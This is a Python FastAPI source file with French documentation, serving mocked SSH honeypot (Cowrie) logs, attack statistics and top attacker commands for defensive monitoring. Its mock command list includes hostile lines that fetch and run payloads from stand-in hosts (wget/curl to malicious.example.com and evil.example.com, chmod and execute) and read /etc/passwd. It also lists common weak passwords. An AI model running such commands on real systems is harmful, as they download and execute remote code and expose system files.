from fastapi import FastAPI, Query
from fastapi.openapi.utils import get_openapi
from pydantic import BaseModel
from typing import Optional
from datetime import datetime, timedelta
import random

# App setup

app = FastAPI(
    title="Honeypot as a Service — API",
    description=(
        "API de consultation des logs et statistiques collectés par les honeypots SSH Cowrie.\n\n"
        "Les données sont centralisées par le collecteur Python et enrichies avec GeoIP.\n\n"
        "> **Note** : en l'absence du collecteur, les données retournées sont mockées "
        "mais respectent la structure Loki cible."
    ),
    version="1.0.0",
    contact={"name": "Honeypot Team"},
)

# Mock data

COUNTRIES = ["China", "Russia", "United States", "Germany", "Brazil", "Netherlands", "France", "India"]
IPS = [
    "45.33.32.156", "192.241.235.82", "80.82.77.139",
    "91.121.87.31", "185.220.101.47", "103.21.244.0",
    "198.51.100.42", "203.0.113.7", "77.88.8.8", "1.1.1.1",
]
COMMANDS = [
    "uname -a", "cat /etc/passwd", "whoami", "id", "ls -la /",
    "wget http://malicious.example.com/payload.sh",
    "curl -s http://evil.example.com/c2",
    "chmod +x payload.sh", "./payload.sh",
    "cat /proc/cpuinfo", "free -m", "netstat -an",
    "ps aux", "history", "echo 'owned' > /tmp/pwned",
]
USERNAMES = ["root", "admin", "user", "ubuntu", "pi", "oracle", "postgres", "deploy"]
PASSWORDS = ["123456", "password", "admin", "root", "toor", "letmein", "qwerty"]


def _random_log(index: int) -> dict:
    ts = datetime.utcnow() - timedelta(minutes=random.randint(0, 1440))
    ip = random.choice(IPS)
    return {
        "id": f"log-{index:05d}",
        "timestamp": ts.isoformat() + "Z",
        "source_ip": ip,
        "country": random.choice(COUNTRIES),
        "username": random.choice(USERNAMES),
        "password": random.choice(PASSWORDS),
        "command": random.choice(COMMANDS) if random.random() > 0.3 else None,
        "session_id": f"sess-{random.randint(10000, 99999)}",
        "honeypot_node": f"cowrie-pod-{random.randint(1, 5)}",
        "success": False,  # honeypot rejects all auth
    }


# Pre-generate a stable mock dataset
random.seed(42)
MOCK_LOGS = [_random_log(i) for i in range(500)]

# Response models


class LogEntry(BaseModel):
    id: str
    timestamp: str
    source_ip: str
    country: str
    username: str
    password: str
    command: Optional[str]
    session_id: str
    honeypot_node: str
    success: bool

    model_config = {
        "json_schema_extra": {
            "example": {
                "id": "log-00001",
                "timestamp": "2024-05-18T10:23:45Z",
                "source_ip": "45.33.32.156",
                "country": "China",
                "username": "root",
                "password": "123456",
                "command": "cat /etc/passwd",
                "session_id": "sess-42137",
                "honeypot_node": "cowrie-pod-2",
                "success": False,
            }
        }
    }


class StatsResponse(BaseModel):
    total_attempts: int
    unique_ips: int
    unique_countries: int
    top_country: str
    top_username: str
    top_password: str
    attacks_last_24h: int
    attacks_last_hour: int

    model_config = {
        "json_schema_extra": {
            "example": {
                "total_attempts": 500,
                "unique_ips": 10,
                "unique_countries": 8,
                "top_country": "China",
                "top_username": "root",
                "top_password": "123456",
                "attacks_last_24h": 480,
                "attacks_last_hour": 21,
            }
        }
    }


class TopCommand(BaseModel):
    command: str
    count: int
    percentage: float

    model_config = {
        "json_schema_extra": {
            "example": {"command": "cat /etc/passwd", "count": 42, "percentage": 12.5}
        }
    }


class TopCommandsResponse(BaseModel):
    total_commands_executed: int
    top_commands: list[TopCommand]

    model_config = {
        "json_schema_extra": {
            "example": {
                "total_commands_executed": 350,
                "top_commands": [
                    {"command": "cat /etc/passwd", "count": 42, "percentage": 12.0},
                    {"command": "uname -a", "count": 38, "percentage": 10.86},
                ],
            }
        }
    }


# Endpoints

@app.get(
    "/logs",
    response_model=list[LogEntry],
    summary="Récupérer les logs bruts",
    description=(
        "Retourne les logs d'authentification SSH bruts collectés par les honeypots Cowrie.\n\n"
        "Chaque entrée représente une tentative de connexion avec ses métadonnées GeoIP.\n\n"
        "Supporte la pagination via `skip` et `limit`, et un filtre optionnel par pays."
    ),
    tags=["Logs"],
)
def get_logs(
    skip: int = Query(default=0, ge=0, description="Nombre d'entrées à ignorer (pagination)"),
    limit: int = Query(default=50, ge=1, le=200, description="Nombre maximum d'entrées retournées (max 200)"),
    country: Optional[str] = Query(default=None, description="Filtrer par pays (ex: `China`, `Russia`)"),
):
    """
    Retourne les logs bruts des tentatives SSH.

    - **skip** : offset pour la pagination
    - **limit** : taille de la page (max 200)
    - **country** : filtre optionnel sur le pays source
    """
    data = MOCK_LOGS
    if country:
        data = [l for l in data if l["country"].lower() == country.lower()]
    return data[skip: skip + limit]


@app.get(
    "/stats",
    response_model=StatsResponse,
    summary="Statistiques globales d'attaques",
    description=(
        "Retourne un résumé agrégé des attaques : nombre total de tentatives, "
        "IPs uniques, pays représentés, identifiants les plus utilisés, "
        "et volume d'attaques sur les dernières 24h / dernière heure."
    ),
    tags=["Statistiques"],
)
def get_stats():
    """
    Agrège les données mockées pour produire des métriques globales.
    """
    from collections import Counter

    ips = [l["source_ip"] for l in MOCK_LOGS]
    countries = [l["country"] for l in MOCK_LOGS]
    usernames = [l["username"] for l in MOCK_LOGS]
    passwords = [l["password"] for l in MOCK_LOGS]

    now = datetime.utcnow()
    last_24h = sum(
        1 for l in MOCK_LOGS
        if (now - datetime.fromisoformat(l["timestamp"].replace("Z", ""))).total_seconds() < 86400
    )
    last_hour = sum(
        1 for l in MOCK_LOGS
        if (now - datetime.fromisoformat(l["timestamp"].replace("Z", ""))).total_seconds() < 3600
    )

    return StatsResponse(
        total_attempts=len(MOCK_LOGS),
        unique_ips=len(set(ips)),
        unique_countries=len(set(countries)),
        top_country=Counter(countries).most_common(1)[0][0],
        top_username=Counter(usernames).most_common(1)[0][0],
        top_password=Counter(passwords).most_common(1)[0][0],
        attacks_last_24h=last_24h,
        attacks_last_hour=last_hour,
    )


@app.get(
    "/top-commands",
    response_model=TopCommandsResponse,
    summary="Top commandes exécutées par les attaquants",
    description=(
        "Retourne le classement des commandes shell les plus fréquemment tapées "
        "par les attaquants une fois connectés au honeypot.\n\n"
        "Utile pour identifier les patterns d'exploitation (reconnaissance, téléchargement de payload, etc.).\n\n"
        "Le paramètre `top_n` permet de limiter le nombre de résultats retournés."
    ),
    tags=["Statistiques"],
)
def get_top_commands(
    top_n: int = Query(default=10, ge=1, le=50, description="Nombre de commandes à retourner (max 50)"),
):
    """
    Classe les commandes par fréquence d'utilisation.

    - **top_n** : combien de commandes retourner dans le classement
    """
    from collections import Counter

    commands = [l["command"] for l in MOCK_LOGS if l["command"] is not None]
    total = len(commands)
    counter = Counter(commands)

    top = [
        TopCommand(
            command=cmd,
            count=count,
            percentage=round(count / total * 100, 2) if total else 0.0,
        )
        for cmd, count in counter.most_common(top_n)
    ]

    return TopCommandsResponse(total_commands_executed=total, top_commands=top)


# Health check


@app.get(
    "/health",
    summary="Health check",
    description="Endpoint de liveness/readiness pour Kubernetes.",
    tags=["System"],
)
def health():
    return {"status": "ok"}
